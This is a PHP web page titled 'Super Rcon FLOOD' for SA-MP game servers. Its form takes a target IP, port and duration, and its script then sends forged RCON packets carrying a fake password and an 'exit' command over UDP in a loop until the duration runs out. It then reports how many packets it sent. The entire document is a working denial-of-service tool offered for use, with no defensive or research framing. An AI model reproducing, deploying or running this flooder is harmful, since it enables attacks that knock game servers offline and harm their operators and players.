<html>
<body>
<center>
<font color="00FF00">
<pre>
Super Rcon FLOOD for SA-MP Bottionz
</pre>
<STYLE>
input{
background-color: #00FF00; font-size: 8pt; color: #000000; font-family: Tahoma; border: 1 solid #666666;
}
button{
background-color: #00FF00; font-size: 8pt; color: #000000; font-family: Tahoma; border: 1 solid #666666;
}
body { 
background-color: #000000;
}
</style>
<?php
if(isset($_GET['host'])&&isset($_GET['port'])&&isset($_GET['time'])){
    $packets = 0;
	$fakepass = "4azr46a";
	$fakecmd = "exit";
	$sPacket = "";  
    ignore_user_abort(TRUE);
    set_time_limit(0);
    
    $exec_time = $_GET['time'];    
    $time = time();
    $max_time = $time+$exec_time;
    $host = $_GET['host'];    
    $port = $_GET['port'];	
    
	$aIPAddr = explode('.', $host); 
	$sPacket .= "SAMP";
 
	$sPacket .= chr($aIPAddr[0]);
	$sPacket .= chr($aIPAddr[1]);
	$sPacket .= chr($aIPAddr[2]);
	$sPacket .= chr($aIPAddr[3]);
 
	$sPacket .= chr($port & 0xFF);
	$sPacket .= chr($port >> 8 & 0xFF);
 
	$sPacket .= 'x';
	
	$sPacket .= chr(strlen($fakepass) & 0xFF);
	$sPacket .= chr(strlen($fakepass) >> 8 & 0xFF);
	$sPacket .= $fakepass;
	$sPacket .= chr(strlen($fakecmd) & 0xFF);
	$sPacket .= chr(strlen($fakecmd) >> 8 & 0xFF);
	$sPacket .= $fakecmd;
	
    while(1){
    $packets++;
            if(time() > $max_time){
                    break;
            }
            //$rand = rand(1,65000);
            $fp = fsockopen('udp://'.$host, $port, $errno, $errstr, 2);
			fwrite($fp, $sPacket); 
            if($fp){
                    fwrite($rSocket, $sPacket); 
                    fclose($fp);
            }
    }
    echo "<br><b>Super Rcon FLOOD</b><br>Completed with $packets (" . round(($packets*65)/9999, 2) . " MB) packets averaging ". round($packets/$exec_time, 2) . " packets per second \n";
    echo '<br><br>
        <form action="'.$surl.'" method=GET>
        <input type="hidden" name="act" value="phptools">
        IP: <br><input type=text name=host><br> Port: <br><input type=text name=port><br>
        Temps(en secondes): <br><input type=text name=time><br>
        <input type=submit value=Go></form>';
}else{ echo '<br><b>Super Rcon FLOOD</b><br>
            <form action=? method=GET>
            <input type="hidden" name="act" value="phptools">
            IP: <br><input type=text name=host value=><br> Port: <br><input type=text name=port><br>
            Temps(en secondes): <br><input type=text name=time value=><br><br>
            <input type=submit value=Go></form>';
}
?>
</center>
</body>
</html>